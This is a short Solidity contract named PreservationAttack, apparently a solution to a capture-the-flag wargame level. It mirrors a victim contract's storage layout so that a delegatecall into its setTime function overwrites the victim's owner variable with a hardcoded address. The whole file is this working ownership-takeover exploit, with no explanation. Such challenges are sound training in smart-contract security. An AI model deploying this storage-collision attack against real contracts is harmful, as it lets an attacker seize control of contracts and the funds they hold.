// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
  // victim's state variables 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint _time) public {
    owner = 0x4545c437d127B29bF0BB080DeEe97f159AB827d8;
  }
}